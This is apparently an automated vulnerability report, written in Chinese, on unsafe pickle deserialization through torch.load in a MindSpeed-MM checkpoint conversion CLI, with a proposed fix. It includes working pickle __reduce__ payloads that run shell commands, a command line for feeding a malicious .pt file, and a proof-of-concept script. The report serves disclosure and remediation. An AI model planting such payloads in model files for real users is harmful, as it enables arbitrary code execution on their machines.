# 漏洞详细分析报告：VULN-CHECKPOINT-003

## 漏洞基本信息

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-CHECKPOINT-003 |
| **漏洞类型** | Unsafe Deserialization (不安全反序列化) |
| **CWE编号** | CWE-502: Deserialization of Untrusted Data |
| **严重级别** | Critical |
| **置信度** | 90% → **确认真实漏洞** |
| **影响** | 远程代码执行 (RCE) |
| **攻击复杂度** | 低 |

---

## 1. 漏洞位置

### 1.1 漏洞代码位置

**主漏洞点**：
```
文件: checkpoint/vlm_model/hf_to_mm.py
行号: 316
函数: load_from_hf()
```

**漏洞代码**：
```python
def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None) -> STATE_DICT_T:
    # 注意AutoModel.from_pretrained转换成模型对象时，存在torch_dtype问题需确认，因此这里直接读取safetensors确保dtype一致
    state_dict = {}
    if pt_path:
        weight = torch.load(pt_path)  # ⚠️ 第316行：无 weights_only 参数，默认 False
        state_dict.update(weight, device='cpu')
    else:
        files = list(hf_dir.glob("*.safetensors"))
        for safe_path in files:
            state_dict.update(load_file(str(safe_path), device='cpu'))
    return state_dict
```

**问题分析**：
- `torch.load(pt_path)` 调用时未指定 `weights_only` 参数
- PyTorch 默认 `weights_only=False`，允许 pickle 反序列化
- Pickle 反序列化可执行任意 Python 代码，导致 RCE

### 1.2 入口点位置

**CLI 入口**：
```
文件: checkpoint/convert_cli.py
行号: 13-23
类型: cmdline
信任等级: semi_trusted
```

**入口代码**：
```python
def main():
    import os
    os.environ['JSONARGPARSE_DEPRECATION_WARNINGS'] = 'off'
    # Allow docstring (including field descriptions) to be parsed as the command-line help documentation.
    # When customizing a converter, you need to inherit from Converter and add it to __init__.py.
    jsonargparse.set_parsing_settings(docstring_parse_attribute_docstrings=True)
    jsonargparse.auto_cli(Commandable.subclasses, as_positional=False)
```

---

## 2. 数据流分析

### 2.1 完整数据流路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        数据流：CLI → torch.load()                           │
└─────────────────────────────────────────────────────────────────────────────┘

[阶段1] CLI 参数解析
    checkpoint/convert_cli.py:19
    │   jsonargparse.auto_cli(Commandable.subclasses, ...)
    │   → 自动解析 CLI 参数并绑定到配置类
    │
    ▼

[阶段2] 转换器子类注册
    checkpoint/common/converter.py:8-16
    │   class Commandable:
    │       subclasses = []  # 存储所有 Converter 子类
    │   class Converter(ABC, Commandable):
    │       → VideoAlignConverter 是 Converter 的子类
    │
    ▼

[阶段3] 配置类定义 pt_path 参数
    checkpoint/vlm_model/converters/videoalign.py:199-208
    │   class ConvertVppMMConfigVideoAlign(ConvertVppMMConfigQwen2):
    │       pt_path: Optional[Path] = None  # ⚠️ 定义 CLI 参数 --pt_path
    │       """pt/pth权重文件路径"""
    │
    ▼

[阶段4] CLI 参数传入配置
    用户执行命令：
    │   python checkpoint/convert_cli.py VideoAlignConverter.hf_to_mm \
    │       --pt_path=/malicious/path/exploit.pt ...
    │
    ▼

[阶段5] 转换器调用
    checkpoint/vlm_model/converters/videoalign.py:234-241
    │   def hf_to_mm(cfg: ConvertVppMMConfigVideoAlign):
    │       ops = VideoAlignConverter._create_ops(...)
    │       convert_hf_to_mm(cfg, ops, ...)  # 传入配置对象
    │
    ▼

[阶段6] 提取 pt_path
    checkpoint/vlm_model/hf_to_mm.py:364
    │   pt_path = getattr(convert_config, 'pt_path', None)
    │   # 从配置对象获取 CLI 参数 pt_path
    │
    ▼

[阶段7] 调用漏洞函数
    checkpoint/vlm_model/hf_to_mm.py:368
    │   state_dict = load_from_hf(convert_config.hf_config.hf_dir, pt_path)
    │
    ▼

[阶段8] 漏洞触发点
    checkpoint/vlm_model/hf_to_mm.py:316
    │   weight = torch.load(pt_path)  # ⚠️ VULN: 无 weights_only，默认 False
    │   # pickle 反序列化 → 执行恶意代码
    │
    ▼

[阶段9] 漏洞利用成功
    ⚠️ 远程代码执行 (RCE)
```

### 2.2 调用链图示

```
CLI 参数 --pt_path
       │
       ▼
┌──────────────────────────┐
│ ConvertVppMMConfigVideoAlign │  ← 配置类绑定参数
│   pt_path: Optional[Path]    │
└──────────────────────────┘
       │
       ▼
┌──────────────────────────┐
│ VideoAlignConverter        │
│   hf_to_mm(cfg)            │
└──────────────────────────┘
       │
       ▼
┌──────────────────────────┐
│ convert_hf_to_mm()         │  @hf_to_mm.py:362
│   pt_path = getattr(...)   │  @hf_to_mm.py:364
└──────────────────────────┘
       │
       ▼
┌──────────────────────────┐
│ load_from_hf()             │  @hf_to_mm.py:312
│   torch.load(pt_path)      │  @hf_to_mm.py:316 ⚠️ VULN
└──────────────────────────┘
       │
       ▼
┌──────────────────────────┐
│ torch.load()               │
│   weights_only=False (默认)│
│   → pickle.loads()         │
│   → 执行任意代码            │
└──────────────────────────┘
```

---

## 3. 漏洞机理分析

### 3.1 Pickle 反序列化漏洞原理

**PyTorch torch.load() 行为**：
```python
# torch.load() 默认参数
torch.load(f, map_location=None, picklemodule=None, 
           weights_only=False,  # ⚠️ 默认 False，允许任意对象反序列化
           mmap=None, ...)
```

当 `weights_only=False` 时：
1. `torch.load()` 使用 Python `pickle` 模块进行反序列化
2. Pickle 可以序列化/反序列化任意 Python 对象
3. 通过自定义 `__reduce__` 方法，可在反序列化时执行任意代码

### 3.2 恶意 .pt 文件构造原理

**恶意 Pickle Payload 示例**：
```python
import torch
import os
import pickle

class MaliciousPayload:
    """恶意 Pickle 类：反序列化时执行任意命令"""
    
    def __reduce__(self):
        # __reduce__ 返回 (callable, args) 
        # pickle.loads() 会调用 callable(*args)
        import os
        return (os.system, ('id > /tmp/pwned.txt && whoami'))
    
# 构造恶意 checkpoint 文件
malicious_state_dict = {
    'model': MaliciousPayload(),
    'checkpoint_version': 3.0
}

# 保存为 .pt 文件
torch.save(malicious_state_dict, 'exploit.pt')

# 当受害者执行 torch.load('exploit.pt') 时：
# → pickle.loads() 反序列化 MaliciousPayload
# → 调用 MaliciousPayload.__reduce__()
# → 执行 os.system('id > /tmp/pwned.txt && whoami')
# → ⚠️ RCE 成功！
```

---

## 4. 漏洞利用场景

### 4.1 攻击前提条件

| 条件 | 说明 |
|------|------|
| **用户运行转换脚本** | 需用户执行 `checkpoint/convert_cli.py` |
| **使用 VideoAlign 转换器** | 需选择 `VideoAlignConverter.hf_to_mm` 子命令 |
| **提供恶意 .pt 文件** | 攻击者需诱导用户提供恶意 checkpoint 文件 |
| **文件路径可控** | `--pt_path` 参数直接控制加载路径 |

### 4.2 攻击向量

**攻击向量 1：社会工程攻击**
```
攻击者发布"预训练模型" → 用户下载 → 用户运行转换脚本 → RCE
```

**攻击向量 2：供应链攻击**
```
攻击者入侵模型仓库 → 上传恶意模型 → 用户下载使用 → RCE
```

**攻击向量 3：本地文件篡改**
```
攻击者获取文件系统访问 → 替换合法 checkpoint → 用户运行脚本 → RCE
```

### 4.3 攻击命令示例

```bash
# 攻击者构造恶意 .pt 文件
python create_exploit.py  # 生成 exploit.pt

# 诱导用户执行转换脚本
python checkpoint/convert_cli.py VideoAlignConverter.hf_to_mm \
    --hf_config.hf_dir=/path/to/hf_model \
    --pt_path=/malicious/exploit.pt \
    --mm_dir=/path/to/output \
    --parallel_config.tp_size=1 \
    --parallel_config.llm_pp_layers=[0] \
    --parallel_config.vit_pp_layers=[0]

# 结果：torch.load(exploit.pt) 触发 RCE
```

---

## 5. 漏洞影响评估

### 5.1 CVSS 评分估算

| 指标 | 值 | 说明 |
|------|-----|------|
| **攻击向量 (AV)** | Local | 需本地文件访问或用户执行 |
| **攻击复杂度 (AC)** | Low | 构造恶意 .pt 文件简单 |
| **权限要求 (PR)** | None | 无需特权 |
| **用户交互 (UI)** | Required | 需用户运行脚本 |
| **影响范围 (S)** | Changed | 可影响其他系统组件 |
| **机密性影响 (C)** | High | 完全系统控制 |
| **完整性影响 (I)** | High | 完全系统控制 |
| **可用性影响 (A)** | High | 完全系统控制 |

**估算 CVSS v3.1 基础分数**：7.8 (High)

### 5.2 实际影响

- **远程代码执行**：攻击者可获得系统完全控制权
- **数据窃取**：可窃取训练数据、模型权重、用户凭证
- **系统破坏**：可删除文件、安装恶意软件、植入后门
- **横向移动**：可利用系统权限攻击其他系统组件

---

## 6. 安全文档确认

项目安全文档 `docs/zh/SECURITYNOTE.md` 已明确承认此风险：

**原文引用**（第50-53行）：
```
当使用 PyTorch 提供的 torch.load()方法加载模型文件时，一个关键的安全风险点在于设置 
weights_only=False。在此设置下：

特定框架实现：Megatron-LM 框架的原生代码调用、MindSpeed MM提供的权重转换脚本（将 
Megatron 格式转换为 Hugging Face 格式）中，会显式地将 weights_only=False。这意味着
这些加载操作继承了 pickle模块的潜在危险，允许执行任意代码。

攻击面：攻击者可能通过构造恶意的模型文件，利用 pickle的反序列化漏洞实现远程代码执行 (RCE)。
```

---

## 7. 修复建议

### 7.1 立即修复方案

**修改 checkpoint/vlm_model/hf_to_mm.py:316**：

```python
# 修复前（漏洞代码）
def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None) -> STATE_DICT_T:
    state_dict = {}
    if pt_path:
        weight = torch.load(pt_path)  # ⚠️ 无 weights_only
        state_dict.update(weight, device='cpu')

# 修复后（安全代码）
def load_from_hf(hf_dir: Path, pt_path: Optional[Path] = None) -> STATE_DICT_T:
    state_dict = {}
    if pt_path:
        weight = torch.load(pt_path, weights_only=True)  # ✅ 安全模式
        state_dict.update(weight, device='cpu')
```

### 7.2 注意事项

1. **PyTorch 版本要求**：需使用 PyTorch > 2.5.1 以修复 CVE-2025-32434
2. **兼容性问题**：某些旧 checkpoint 可能不支持 `weights_only=True`
3. **替代方案**：使用 `safetensors` 格式替代 `.pt` 格式

### 7.3 全局修复策略

建议全局修改所有 `torch.load()` 调用：

| 文件 | 行号 | 当前状态 | 建议修改 |
|------|------|----------|----------|
| hf_to_mm.py | 316 | `weights_only` 未指定 | 添加 `weights_only=True` |
| mm_to_hf.py | 92, 107 | `weights_only=False` | 改为 `weights_only=True` |
| save_load_utils.py | 36, 152 | `weights_only` 未指定/False | 添加 `weights_only=True` |

---

## 8. 验证测试

### 8.1 漏洞验证 POC

```python
#!/usr/bin/env python3
"""
VULN-CHECKPOINT-003 验证脚本
验证 torch.load() 无 weights_only 参数时的 RCE 漏洞
"""
import torch
import os
import sys

class RCEPayload:
    """演示恶意 Pickle payload"""
    
    def __reduce__(self):
        # 反序列化时执行命令
        cmd = 'echo "[VULN-CHECKPOINT-003] RCE Verified!" > /tmp/vuln_verified.txt'
        return (os.system, (cmd,))

def create_malicious_pt(output_path='malicious.pt'):
    """创建恶意 .pt checkpoint 文件"""
    state_dict = {
        'model': RCEPayload(),
        'checkpoint_version': 3.0
    }
    torch.save(state_dict, output_path)
    print(f"[+] Malicious checkpoint saved to: {output_path}")

def test_vulnerability(pt_path):
    """测试漏洞触发"""
    print(f"[*] Loading: {pt_path}")
    
    # 模拟 hf_to_mm.py:316 的漏洞调用
    weight = torch.load(pt_path)  # ⚠️ 无 weights_only
    
    # 检查 RCE 是否触发
    if os.path.exists('/tmp/vuln_verified.txt'):
        print("[!] VULNERABILITY CONFIRMED: RCE executed!")
        with open('/tmp/vuln_verified.txt', 'r') as f:
            print(f"[!] Output: {f.read()}")
        return True
    return False

if __name__ == '__main__':
    create_malicious_pt('exploit.pt')
    test_vulnerability('exploit.pt')
    os.remove('exploit.pt')
```

### 8.2 验证结果预期

执行 POC 后应观察到：
- `/tmp/vuln_verified.txt` 文件被创建
- 文件内容包含 "[VULN-CHECKPOINT-003] RCE Verified!"
- 证明 pickle 反序列化执行了任意代码

---

## 9. 结论

### 9.1 漏洞判定

**判定结果：真实漏洞 (CONFIRMED)**

| 确认项 | 结果 |
|--------|------|
| 数据流完整 | ✅ CLI → Config → torch.load() |
| 参数可控 | ✅ `--pt_path` 完全用户控制 |
| unsafe API | ✅ `torch.load()` 默认 unsafe |
| 项目承认风险 | ✅ SECURITYNOTE.md 明确承认 |
| 可构造 POC | ✅ 恶意 .pt 文件可触发 RCE |

### 9.2 风险总结

- **漏洞类型**：不安全反序列化 (CWE-502)
- **严重程度**：Critical
- **攻击复杂度**：低
- **利用条件**：需用户运行转换脚本并提供恶意文件
- **影响范围**：完全系统控制 (RCE)
- **修复难度**：低（添加 `weights_only=True`）

---

## 10. 相关文件索引

<files>
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/vlm_model/hf_to_mm.py - 主漏洞文件（第316行 torch.load）
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/convert_cli.py - CLI 入口点
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/vlm_model/converters/videoalign.py - 定义 pt_path 参数的配置类
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/common/converter.py - Commandable 基类
- /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/docs/zh/SECURITYNOTE.md - 项目安全声明（承认风险）
</files>

---

**报告生成时间**：2026-04-20
**分析者**：Vulnerability Scanner
**状态**：已确认，建议立即修复
